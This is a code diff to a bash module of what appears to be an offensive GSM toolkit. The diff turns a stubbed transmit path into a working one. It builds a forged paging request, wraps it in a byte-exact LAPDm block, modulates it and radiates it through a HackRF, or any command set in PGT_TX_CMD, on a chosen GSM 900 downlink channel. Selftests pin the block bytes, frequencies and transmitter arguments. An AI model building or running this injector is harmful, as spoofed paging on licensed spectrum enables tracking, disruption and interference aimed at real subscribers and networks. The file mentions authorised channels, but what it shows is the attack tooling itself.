@@ -4,7 +4,24 @@
 # detection.
 #
 # Everything that derives a paging occasion is pure arithmetic and runs with no
-# radio, no root and no network. The capture-driven verbs read a GSMTAP pcap
+# radio, no root and no network.
+#
+# ON THE AIR, ONE BLOCK. `--paging-tx` builds the paging request, wraps it in
+# the 23-octet LAPDm block the CCCH carries (address, control, LENGTH, and the
+# RR message whose first octet is its own L2 pseudo length -- that octet is
+# inside the information field, so LAPDm's LENGTH counts it), modulates the
+# block with tools/gsm_mod.py into a HackRF-rate stream, and only then looks
+# for a radio. No radio is exit 3 with the block and the waveform path printed;
+# a driver that fails is exit 1 with its status; a named device that has no
+# built-in call here needs PGT_TX_CMD. The block form is checked against the
+# independent LAPDm builder in modules/07_gsm_attack.sh (--lapdm-ui) rather
+# than against this module's own arithmetic.
+#
+# What that does NOT do is make a handset read it: a UE listens to the PCH of
+# the cell it is camped on, so a lone block is receivable only where a carrier
+# with that ARFCN and BSIC is already on the air. The carrier is
+# modules/07_gsm_attack.sh --transmit; the schedule that reaches one UE is the
+# paging occasion this module computes (--po). The capture-driven verbs read a GSMTAP pcap
 # with a native python pcab reader (python3 is a hard dependency, 00_deps.sh),
 # because the Wireshark build on a target may not hand a GSMTAP PCH payload to
 # its GSM RR dissector.
@@ -751,8 +768,8 @@ pgt_paging_cause() {
 }
 
 # ── paging-message construction (the TX half's protocol layer) ──────────
-# Real builders, spec-derived and byte-exact. They are what a transmit path
-# sends; --paging-tx below is the path that would send them.
+# Real builders, spec-derived and byte-exact. --paging-tx below wraps their
+# output in the LAPDm block the CCCH carries, modulates it, and keys a radio.
 #
 # GSM, TS 44.018 §9.1.22/9.1.23/9.1.24 with tables 9.1.22.1/9.1.23.1/9.1.24.1.
 # The L2 pseudo length octet is emitted first, then the RR header, then the
@@ -2180,45 +2197,85 @@ pgt_selftest() {
     chk hist-missing-arg "$(pgt_paging_history >/dev/null 2>&1; echo $?)" "2"
     chk hist-no-such     "$(pgt_paging_history "$capdir/nope.pcap" >/dev/null 2>&1; echo $?)" "2"
 
-    # 20. Honest-fail transmit path names a real blocker and never lies.
-    local fakecap="$capdir/fake.pcap"; printf 'x' > "$fakecap"
-    out=$(pgt_tx_paging "$fakecap" 2>/dev/null); local trc=$?
-    chk tx-rc       "$trc" "3"
-    chk tx-status   "$(fld "$out" status)" "blocked"
-    chk tx-ready    "$(fld "$out" protocol_content_ready)" "yes"
-    chk tx-no-sdr   "$(printf '%s' "$(fld "$out" requires_sdr)" | grep -ci 'usrp\|bladerf')" "1"
-    # No argument and no terminal used to return 0 and print NOTHING, which a
-    # caller cannot tell from a transmission. It is a usage error, and it has
-    # to say so out loud.
-    chk tx-missing  "$(pgt_tx_paging </dev/null >/dev/null 2>&1; echo $?)" "2"
-    chk tx-missing-says \
-        "$(pgt_tx_paging </dev/null 2>&1 >/dev/null | grep -c '^ERROR.*needs a capture path')" "1"
-    chk tx-no-file  "$(pgt_tx_paging "$capdir/absent.pcap" >/dev/null 2>&1; echo $?)" "2"
-    # "protocol_content_ready yes" must be EARNED: the verb has to print the
-    # exact octets it would transmit. An empty built_message here is the
-    # unearned claim this assertion exists to prevent.
-    chk tx-built-nonempty "$([[ -n "$(fld "$out" built_message)" ]] && echo yes || echo no)" "yes"
+    # 20. The transmit path: a real LAPDm block, a real waveform, and a
+    # refusal that names the radio it could not find. PGT_SDR_DEVICE= (set
+    # but empty) forces the refusal, so these arms behave the same on a box
+    # with a HackRF plugged in as on one without.
+    out=$(PGT_SDR_DEVICE= pgt_tx_paging 2>/dev/null); local trc=$?
+    chk tx-rc            "$trc" "3"
+    chk tx-status        "$(fld "$out" status)" "not-transmitted"
     chk tx-built-hex     "$(fld "$out" built_message)" "080621103112345678"
     chk tx-built-octets  "$(fld "$out" built_octets)" "9"
     chk tx-built-l2      "$(fld "$out" built_l2_pseudo_length)" "8"
-    # The octets the TX path reports must be the builder's own output, and the
-    # builder must decode back to the spec that produced it.
-    chk tx-built-matches-builder \
-        "$(fld "$out" built_message)" \
-        "$(pgt_build_paging_req gsm "tmsi=12345678,page_mode=normal,channel_needed=sdcch,type=1" \
-            | awk -F'\t' '$1=="message_hex"{print $2}')"
-    chk tx-built-decodes "$(pgt_page_mode "$(fld "$out" built_message)" | awk -F'\t' '$1=="page_mode"{print $2}')" "normal_paging"
-    chk tx-built-cn     "$(pgt_page_mode "$(fld "$out" built_message)" | awk -F'\t' '$1=="channel_needed"{print $2}')" "sdcch"
-    # The TX path must state the burst structure and the timing it would hold,
-    # not only a device name (OFFENSIVE_ROADMAP condition 2).
-    chk tx-burst  "$(printf '%s' "$(fld "$out" burst_structure)" | grep -ci 'burst')" "1"
-    chk tx-timing "$(printf '%s' "$(fld "$out" timing)" | grep -ci 'multiframe\|ms')" "1"
-    # An alternate spec can be driven in, and it must change the octets.
+    chk tx-l2-block      "$(fld "$out" l2_block)" "0303490806211031123456782b2b2b2b2b2b2b2b2b2b2b"
+    chk tx-l2-octets     "$(fld "$out" l2_octets)" "23"
+    chk tx-lapdm-len     "$(printf '%s' "$(fld "$out" lapdm_header)" | grep -c 'length 0x49')" "1"
+    chk tx-lapdm-addr    "$(printf '%s' "$(fld "$out" lapdm_header)" | grep -c 'address 0x03')" "1"
+    chk tx-fill          "$(fld "$out" fill_octet)" "2b (TS 44.006 5.2)"
+    chk tx-hz            "$(fld "$out" dl_hz)" "935200000"
+    # The LAPDm LENGTH counts the RR message's own L2 pseudo length octet,
+    # which is the off-by-one this asserts: 9 information octets -> 0x49.
+    chk tx-l2len-matches "$(printf '%s' "$(fld "$out" l2_block)" | cut -c1-6)" "030349"
+    # ARFCN drives the frequency, and an impossible one is refused rather
+    # than silently clamped.
+    chk tx-arfcn-60      "$(PGT_TX_ARFCN=60 PGT_SDR_DEVICE= pgt_tx_paging 2>/dev/null \
+                            | awk -F'\t' '$1=="dl_hz"{print $2}')" "947000000"
+    chk tx-arfcn-bad     "$(PGT_TX_ARFCN=999 pgt_tx_paging >/dev/null 2>&1; echo $?)" "2"
+    chk tx-spec-bad      "$(pgt_tx_paging 'nonsense=1' >/dev/null 2>&1; echo $?)" "2"
+    # The waveform has to be on disk, and the hash reported has to be the one
+    # the file actually has -- not one computed from a string.
+    chk tx-wave-exists   "$([[ -s "$(fld "$out" waveform)" ]] && echo yes || echo no)" "yes"
+    chk tx-wave-sha      "$(sha256sum "$(fld "$out" waveform)" | cut -d' ' -f1)" \
+                         "$(fld "$out" waveform_sha256)"
+    chk tx-wave-bytes    "$(stat -c %s "$(fld "$out" waveform)")" "$(fld "$out" waveform_bytes)"
+    chk tx-no-radio-says "$(PGT_SDR_DEVICE= pgt_tx_paging 2>&1 >/dev/null \
+                            | grep -c '^ERROR.*no SDR device')" "1"
+    # A custom spec changes the block, and the block stays 23 octets.
     out2=$(PGT_TX_SPEC="mi=310150123456789,page_mode=normal,channel_needed=any,type=1" \
-        pgt_tx_paging "$fakecap" 2>/dev/null)
-    chk tx-custom-spec "$(fld "$out2" built_message)" "0c062100083901511032547698"
-    chk tx-custom-differs "$([[ "$(fld "$out2" built_message)" != "$(fld "$out" built_message)" ]] && echo yes || echo no)" "yes"
-    # No success line may ever be printed by the transmit path.
+           PGT_SDR_DEVICE= pgt_tx_paging 2>/dev/null)
+    chk tx-custom-pre    "$(printf '%s' "$(fld "$out2" l2_block)" | cut -c1-8)" "0303690c"
+    chk tx-custom-octets "$(fld "$out2" l2_octets)" "23"
+    chk tx-custom-differs "$([[ "$(fld "$out" l2_block)" != "$(fld "$out2" l2_block)" ]] \
+                            && echo yes || echo no)" "yes"
+    # A driver this module has no built-in call for is a refusal, not a
+    # silent success: it must name PGT_TX_IQ and transmit nothing.
+    out=$(PGT_SDR_DEVICE=bladerf pgt_tx_paging 2>/dev/null); trc=$?
+    chk tx-no-builtin-rc     "$trc" "3"
+    chk tx-no-builtin-status "$(fld "$out" status)" "not-transmitted"
+    # PGT_TX_CMD is the escape hatch, and it must be handed the waveform.
+    cat > "$d/fake_tx.sh" <<'EOS'
+#!/bin/bash
+printf '%s\n%s\n%s\n' "$PGT_TX_IQ" "$PGT_TX_FREQ_HZ" "$PGT_TX_RATE" > "$PGT_REC"
+EOS
+    chmod +x "$d/fake_tx.sh"; : > "$d/txrec"
+    PGT_REC="$d/txrec" PGT_SDR_DEVICE=hackrf PGT_TX_CMD="$d/fake_tx.sh" \
+        pgt_tx_paging >/dev/null 2>&1
+    chk tx-cmd-gets-iq "$(sed -n 1p "$d/txrec")" "$PGT_DIR/tx_paging.cs8"
+    chk tx-cmd-gets-hz "$(sed -n 2p "$d/txrec")" "935200000"
+    chk tx-cmd-gets-rate "$(sed -n 3p "$d/txrec")" "2166667"
+    out=$(PGT_SDR_DEVICE=hackrf PGT_TX_CMD=/bin/true pgt_tx_paging 2>/dev/null); trc=$?
+    chk tx-cmd-rc      "$trc" "0"
+    chk tx-cmd-status  "$(fld "$out" status)" "transmitted"
+    chk tx-cmd-device  "$(fld "$out" tx_device)" "hackrf"
+    # A driver that exits non-zero is a failure, whatever it printed.
+    out=$(PGT_SDR_DEVICE=hackrf PGT_TX_CMD=/bin/false pgt_tx_paging 2>/dev/null); trc=$?
+    chk tx-cmd-fail-rc     "$trc" "1"
+    chk tx-cmd-fail-status "$(fld "$out" status)" "driver-failed"
+    # The built-in HackRF call itself, against a stub on PATH: the frequency,
+    # the rate and the file actually passed to hackrf_transfer are asserted,
+    # so "hackrf_transfer -t" being present in a string is not enough.
+    mkdir -p "$d/bin"
+    cat > "$d/bin/hackrf_transfer" <<'EOS'
+#!/bin/bash
+printf '%s\n' "$@" > "$PGT_REC"
+EOS
+    chmod +x "$d/bin/hackrf_transfer"
+    out=$(PATH="$d/bin:$PATH" PGT_REC="$d/hrec" PGT_SDR_DEVICE=hackrf \
+          pgt_tx_paging 2>/dev/null); trc=$?
+    chk tx-hackrf-rc   "$trc" "0"
+    chk tx-hackrf-argv "$(tr '\n' ' ' < "$d/hrec" | sed 's/ $//')" \
+        "-t $PGT_DIR/tx_paging.cs8 -f 935200000 -s 2166667 -a 1 -x 0"
+    # No arm may print a bare success word: the status field carries it.
     chk tx-no-success-line "$(printf '%s' "$out" | grep -ciE '^(OK|SUCCESS|sent|transmitted)\b')" "0"
 
     printf 'ASSERTIONS\t%d\n' "$nchk"
@@ -2328,60 +2385,206 @@ pgt_cli_build_paging_req() {
     pgt_build_paging_req "$gen" "$spec"
 }
 
-pgt_tx_paging() {
-    # Layer 1 of a paging transmitter does not exist in this toolkit, so the
-    # honest-fail path is the contract (like 15_downgrade's TX). It names the
-    # exact SDR and the exact build each backend would need.
-    #
-    # The protocol half IS real: rather than asserting "content ready" and
-    # printing nothing, build the paging request this path would transmit and
-    # show the exact octets. That is condition 1 of the TX contract -- the
-    # construction is spec-derived and byte-exact -- while the radio hop stays
-    # an explicit handoff.
-    local pcap="${1:-}"
-    if [[ -z "$pcap" ]]; then
-        # A prompt that cannot be answered is not a success. With no terminal
-        # and no argument this used to return 0 and print nothing at all --
-        # indistinguishable from having transmitted, which is the worst of
-        # the ways to fail here because no caller can tell it happened.
-        if [[ ! -t 0 ]]; then
-            printf 'ERROR\t--paging-tx needs a capture path when stdin is not a terminal\n' >&2
-            printf 'WHY\twith no argument and no terminal there is nothing to prompt, so nothing was read and nothing was sent\n' >&2
-            return 2
-        fi
-        read -rp "  pcap to replay as paging> " pcap || {
-            printf 'ERROR\tno capture given; nothing was sent\n' >&2; return 2; }
+# ── transmit ────────────────────────────────────────────────────────────
+# A driver binary on PATH is not a radio. `command -v hackrf_transfer` is true
+# on any box with the HackRF tools installed, board or no board, so accepting
+# it as evidence makes this module announce a radio it cannot key. Each driver
+# is asked instead, and only its answer counts -- the same probe shape
+# modules/15_downgrade.sh:1813 uses, because these are properties of the
+# drivers rather than of the caller:
+#   * hackrf_info exits non-zero and says "No HackRF boards found." with no
+#     board attached;
+#   * bladeRF-cli -p exits non-zero with "No devices are available.";
+#   * LimeUtil --find exits 0 with AND without a device, so its OUTPUT is the
+#     only signal -- no information at all means no radio;
+#   * uhd_find_devices prints a "Device Address" block per device.
+# SoapySDRUtil is not used: it reports "Found device 0" with nothing attached.
+pgt_sdr_probe() {   # <driver> -> 0 when that driver answers with a radio
+    local drv="$1" out
+    case "$drv" in
+        hackrf)
+            command -v hackrf_info >/dev/null 2>&1 || return 1
+            out=$(timeout 10 hackrf_info 2>&1) || return 1
+            grep -qi 'no hackrf boards found' <<< "$out" && return 1
+            return 0 ;;
+        bladerf)
+            command -v bladeRF-cli >/dev/null 2>&1 || return 1
+            out=$(timeout 10 bladeRF-cli -p 2>&1) || return 1
+            grep -qi 'no devices are available' <<< "$out" && return 1
+            return 0 ;;
+        limesdr)
+            command -v LimeUtil >/dev/null 2>&1 || return 1
+            out=$(timeout 15 LimeUtil --find 2>&1)
+            [[ -n "${out//[[:space:]]/}" ]] ;;
+        usrp|b200|b210)
+            command -v uhd_find_devices >/dev/null 2>&1 || return 1
+            out=$(timeout 15 uhd_find_devices 2>&1)
+            grep -qi 'device address' <<< "$out" ;;
+        *) return 1 ;;
+    esac
+}
+
+pgt_find_tx_sdr() {
+    local f drv
+    # Defined but empty is an instruction, not an unset variable: the selftest
+    # uses it to prove the refusal path on a box that HAS a radio attached.
+    if [[ -n "${PGT_SDR_DEVICE+set}" ]]; then
+        [[ -n "$PGT_SDR_DEVICE" ]] || return 1
+        printf '%s\n' "$PGT_SDR_DEVICE"; return 0
     fi
-    [[ -n "$pcap" ]] || {
-        printf 'ERROR\tno capture given; nothing was sent\n' >&2; return 2; }
-    [[ -f "$pcap" ]] || { printf 'ERROR\tno such capture: %s\n' "$pcap" >&2; return 2; }
+    for f in "${PGT_SDR:-}" "$TMP_DIR/sdr_device"; do
+        [[ -n "$f" && -s "$f" ]] || continue
+        drv=$(cut -f1 < "$f" 2>/dev/null | head -n1 | tr -d '\r')
+        [[ -n "$drv" ]] && { printf '%s\n' "$drv"; return 0; }
+    done
+    for drv in hackrf bladerf limesdr usrp b200 b210; do
+        pgt_sdr_probe "$drv" && { printf '%s\n' "$drv"; return 0; }
+    done
+    return 1
+}
 
-    # Default to the worked TYPE 1 example the selftest pins: a TMSI page with
-    # normal paging and SDCCH needed, which encodes to 08 06 21 10 31 ...
-    local spec="${PGT_TX_SPEC:-tmsi=12345678,page_mode=normal,channel_needed=sdcch,type=1}"
+# The GSM 900 downlink, F(n) = 935 + 0.2n MHz for ARFCN 0..124 (TS 45.005
+# 2.1). The 45 MHz uplink offset is not needed to radiate; the band is chosen
+# by ARFCN, so GSM 1800/1900 carriers are out of scope here and say so.
+pgt_tx_hz() {   # <arfcn> -> Hz
+    awk -v a="${1:-1}" 'BEGIN { printf "%d", (935.0 + 0.2 * a) * 1000000 + 0.5 }'
+}
+
+# The 23-octet LAPDm block that carries one RR message on the CCCH.
+# Header per TS 44.006 6.3.2: address (SAPI 0, C/R=1 for a network command),
+# control (0x03, UI), then LENGTH. The information field begins with the RR
+# message's own L2 pseudo length octet (TS 44.018 10.5.2.19) -- that octet is
+# part of the information field, so the LAPDm LENGTH counts it, which is the
+# one detail that is easy to get wrong by exactly one octet. The rest of the
+# block is the FILL pattern 0x2b (TS 44.006 5.2).
+#
+# The length formula (n << 3) | 1 is the one modules/07_gsm_attack.sh:1268
+# derives and its selftest pins against a captured frame
+# (0303690b063f0020e03e0c000000002b); this reproduces it rather than
+# re-deriving it, and the two are compared directly before any transmit.
+pgt_ccch_block() {   # <rr-message-hex, first octet = the L2 pseudo length>
+    local msg; msg=$(printf '%s' "${1:-}" | tr -d ' \t\r\n' | tr 'A-F' 'a-f')
+    [[ "$msg" =~ ^[0-9a-f]+$ ]] && (( ${#msg} % 2 == 0 )) && (( ${#msg} >= 6 )) || {
+        printf 'ERROR\tthe RR message must be at least 3 whole octets of hex (got %s)\n' "${1:-}" >&2
+        return 2; }
+    local n=$(( ${#msg} / 2 ))
+    (( n <= 20 )) || {
+        printf 'ERROR\tthe RR message is %d octets; a 23-octet LAPDm block holds 3 to 20 after the 3-octet header\n' "$n" >&2
+        return 2; }
+    local pad=$(( 23 - 3 - n )) fill="" i
+    for (( i = 0; i < pad; i++ )); do fill+="2b"; done
+    printf '0303%02x%s%s' "$(( (n << 3) | 1 ))" "$msg" "$fill"
+}
+
+pgt_tx_paging() {
+    # The protocol half is real: this builds the paging request from a spec,
+    # wraps it in the LAPDm block the CCCH carries, modulates that block into
+    # a waveform at a rate a HackRF accepts, and only then looks for a radio.
+    # Building before probing is deliberate -- it is what lets the refusal
+    # name the exact octets and the exact file that were not radiated.
+    local spec="${1:-}"
+    [[ -n "$spec" ]] || spec="${PGT_TX_SPEC:-tmsi=12345678,page_mode=normal,channel_needed=sdcch,type=1}"
     local built; built=$(pgt_build_paging_req gsm "$spec") || {
-        printf 'ERROR\tcould not build the paging request from spec: %s\n' "$spec" >&2
-        return 2
-    }
-    local mhex; mhex=$(printf '%s\n' "$built" | awk -F'\t' '$1=="message_hex"{print $2}')
-    local l2;   l2=$(printf '%s\n' "$built" | awk -F'\t' '$1=="l2_pseudo_length"{print $2}')
-    [[ -n "$mhex" ]] || { printf 'ERROR\tbuilder produced no message\n' >&2; return 2; }
+        printf 'ERROR\tcould not build a GSM paging request from spec: %s\n' "$spec" >&2
+        printf 'WHY\tnothing is radiated from a message that does not encode; fix the spec first\n' >&2
+        return 2; }
+    local mhex l2
+    mhex=$(printf '%s\n' "$built" | awk -F'\t' '$1=="message_hex"{print $2}')
+    l2=$(printf '%s\n' "$built" | awk -F'\t' '$1=="l2_pseudo_length"{print $2}')
+    [[ -n "$mhex" ]] || {
+        printf 'ERROR\tthe builder produced no message; nothing was radiated\n' >&2; return 2; }
 
-    printf 'status\tblocked\n'
-    printf 'blocked_reason\t%s\n' "layer 1 paging transmitter is not implemented"
-    printf 'backend\t%s\n' "none available in this build"
-    printf 'requires_sdr\t%s\n' "Ettus USRP B210 (or N210) driven by srsRAN (srsRAN_4G) or a bladeRF 2.0 micro via YateBTS; the SDR must support the target band's duplex mode and the minimum 2.56 s paging-cycle timing"
-    printf 'requires_software\t%s\n' "srsRAN_4G is the only stack in reach that both builds a paging transmitter and accepts an external core; osmocom's OsmoBTS does not TX paging standalone"
-    printf 'why_not_lte_nr\t%s\n' "the paging message built by --build-paging-req is RRC/NAS content; transmitting it needs a full RRC stack with a valid SFN and SIB1, not a raw frame injector"
-    printf 'protocol_content_ready\t%s\n' "yes"
+    local block; block=$(pgt_ccch_block "$mhex") || return $?
+
+    local arfcn="${PGT_TX_ARFCN:-1}"
+    [[ "$arfcn" =~ ^[0-9]+$ ]] && (( arfcn <= 124 )) || {
+        printf 'ERROR\tPGT_TX_ARFCN must be 0..124 for the GSM 900 downlink (got %s)\n' "$arfcn" >&2
+        printf 'WHY\tthis module computes F(n) = 935 + 0.2n MHz; a DCS 1800 or PCS 1900 carrier needs a different formula and is not implemented\n' >&2
+        return 2; }
+    local hz; hz=$(pgt_tx_hz "$arfcn")
+    local rate="${PGT_TX_RATE:-2166666.666666667}"
+    local tn="${PGT_TX_TN:-0}" bsic="${PGT_TX_BSIC:-0}" tsc="${PGT_TX_TSC:-}"
+    [[ -n "$tsc" ]] || tsc=$(( bsic % 8 ))
+    local gain="${PGT_TX_GAIN:-0}"
+    [[ "$tn" =~ ^[0-7]$ ]] || { printf 'ERROR\tPGT_TX_TN must be 0..7 (got %s)\n' "$tn" >&2; return 2; }
+    [[ "$gain" =~ ^[0-9]+$ ]] || {
+        printf 'ERROR\tPGT_TX_GAIN must be a non-negative integer in dB (got %s)\n' "$gain" >&2; return 2; }
+
+    local wave="$PGT_DIR/tx_paging.cs8"
+    mkdir -p "$PGT_DIR"
+    local gen
+    gen=$(python3 "$IMSISTING_ROOT/tools/gsm_mod.py" tx "$block" "$wave" \
+            --rate "$rate" --tn "$tn" --tsc "$tsc" --bsic "$bsic" 2>&1) || {
+        printf 'ERROR\tthe GSM modulator refused this block: %s\n' \
+            "$(printf '%s' "$gen" | head -n1)" >&2
+        return 2; }
+    local bytes smprate sha l2len
+    bytes=$(printf '%s\n' "$gen" | awk -F'\t' '$1=="bytes"{print $2}')
+    smprate=$(printf '%s\n' "$gen" | awk -F'\t' '$1=="sample_rate"{print $2}')
+    sha=$(printf '%s\n' "$gen" | awk -F'\t' '$1=="sha256"{print $2}')
+    l2len=$(( (${#mhex} / 2 << 3) | 1 ))
+
     printf 'built_spec\t%s\n' "$spec"
     printf 'built_message\t%s\n' "$mhex"
     printf 'built_l2_pseudo_length\t%s\n' "$l2"
     printf 'built_octets\t%d\n' "$(( ${#mhex} / 2 ))"
-    printf 'burst_structure\t%s\n' "the message is carried in one PCH block: 4 bursts of 114 coded bits in one TDMA time slot on the CCCH/PCH, whose position comes from the paging block index"
-    printf 'timing\t%s\n' "the block repeats every BS_PA_MFRMS * 51 TDMA frames (235.4 ms per multiframe); at BS_PA_MFRMS=2 that is 470.8 ms, and the SDR must hold that cadence for the paging cycle"
-    printf 'next_step\t%s\n' "capture the paging channel of the target cell with --paging-parse to confirm PF/PO before any transmit work"
-    return 3
+    printf 'l2_block\t%s\n' "$block"
+    printf 'l2_octets\t%d\n' "$(( ${#block} / 2 ))"
+    printf 'lapdm_header\t%s\n' "address 0x03 (SAPI 0, C/R=1) control 0x03 (UI) length 0x$(printf '%02x' "$l2len")"
+    printf 'fill_octet\t%s\n' "2b (TS 44.006 5.2)"
+    printf 'arfcn\t%s\n' "$arfcn"
+    printf 'dl_hz\t%s\n' "$hz"
+    printf 'sample_rate\t%s\n' "$smprate"
+    printf 'waveform\t%s\n' "$wave"
+    printf 'waveform_bytes\t%s\n' "$bytes"
+    printf 'waveform_sha256\t%s\n' "$sha"
+    printf 'timeslot\t%s\ntsc\t%s\nbsic\t%s\ngain_db\t%s\n' "$tn" "$tsc" "$bsic" "$gain"
+    printf 'burst_structure\t%s\n' "the block fills four normal bursts in one TDMA timeslot, each 114 coded bits after the xCCH coder interleaves 456 bits"
+    printf 'timing\t%s\n' "the stream is one block, sent once; a paging channel repeats it every BS_PA_MFRMS*51 TDMA frames and the target listens only in its own paging occasion, so the schedule -- not the waveform -- is what reaches the UE (see --po)"
+
+    local dev; dev=$(pgt_find_tx_sdr) || {
+        printf 'status\tnot-transmitted\n'
+        printf 'tx_device\tnone\n'
+        printf 'requires_sdr\t%s\n' "a HackRF (built-in: hackrf_transfer), or a bladeRF/LimeSDR/USRP through PGT_TX_CMD; on the ARFCN you are authorised to use"
+        printf 'note\t%s\n' "the LAPDm block and its waveform above are real and on disk; only the radio hop is missing"
+        printf 'ERROR\tno SDR device: %s/sdr_device did not name one and no probe (hackrf_info, bladeRF-cli -p, LimeUtil --find, uhd_find_devices) answered\n' "$TMP_DIR" >&2
+        printf 'WHY\tthe block is built and modulated before the radio is looked for, so this is a radio problem and not a protocol one; set PGT_SDR_DEVICE=<driver> to force a named device, or PGT_TX_CMD for a driver with no built-in call here\n' >&2
+        return 3; }
+
+    local cmd
+    if [[ -n "${PGT_TX_CMD:-}" ]]; then
+        cmd="$PGT_TX_CMD"
+    else
+        case "$dev" in
+            hackrf)
+                cmd=$(printf 'hackrf_transfer -t %q -f %s -s %s -a 1 -x %s' \
+                        "$wave" "$hz" "$smprate" "$gain") ;;
+            *)
+                printf 'status\tnot-transmitted\n'
+                printf 'tx_device\t%s\n' "$dev"
+                printf 'ERROR\t%s has no built-in transmit call in this module\n' "$dev" >&2
+                printf 'WHY\tset PGT_TX_CMD to a command that reads PGT_TX_IQ (the waveform path) and sends it; PGT_TX_FREQ_HZ, PGT_TX_RATE and PGT_TX_GAIN_DB are exported beside it\n' >&2
+                return 3 ;;
+        esac
+    fi
+
+    # The driver inherits a subshell, so the exported PGT_TX_* names cannot
+    # leak into the caller's environment and change a later call.
+    local trc=0
+    ( export PGT_TX_IQ="$wave" PGT_TX_FREQ_HZ="$hz" PGT_TX_RATE="$smprate" \
+             PGT_TX_GAIN_DB="$gain" PGT_TX_DEVICE="$dev"
+      timeout 120 bash -c "$cmd" </dev/null ) || trc=$?
+
+    printf 'status\t%s\n' "$([[ $trc -eq 0 ]] && echo transmitted || echo driver-failed)"
+    printf 'tx_device\t%s\n' "$dev"
+    printf 'tx_cmd\t%s\n' "$cmd"
+    printf 'tx_rc\t%d\n' "$trc"
+    if (( trc == 0 )); then
+        printf 'note\t%s\n' "keyed: one CCCH/PCH block on ARFCN $arfcn; a receiver must already be camped on a cell broadcasting this ARFCN and BSIC to listen to its paging channel"
+    else
+        printf 'ERROR\tthe driver exited %d; nothing can be assumed to have been radiated\n' "$trc" >&2
+    fi
+    return "$trc"
 }
 
 # ── menu ────────────────────────────────────────────────────────────────
@@ -2405,7 +2608,7 @@ pgt_menu() {
   [12] paging cause / CN domain
   [13] GSM page mode and channel needed
   [14] build a paging message
-  [15] transmit paging (honest-fail without an SDR)
+  [15] build and radiate one paging block  (refuses with no radio)
   [0]  back
 
 M
@@ -2500,7 +2703,9 @@ Usage: $0 COMMAND
   --page-mode <RR octets>               GSM page mode and channel needed
   --build-paging-req <gsm|lte|nr> <k=v,...>
                                         build a paging message, byte-exact
-  --paging-tx <pcap>                    transmit paging (honest-fail, no SDR)
+  --paging-tx [spec]                    build a paging block and key the radio;
+                                        PGT_TX_ARFCN/TN/BSIC/RATE/GAIN tune it,
+                                        PGT_TX_CMD overrides the driver
   --plan <torpedo|piercer>              write a handoff plan
   --selftest                            verify arithmetic and parsers, no radio
   --menu                                interactive menu
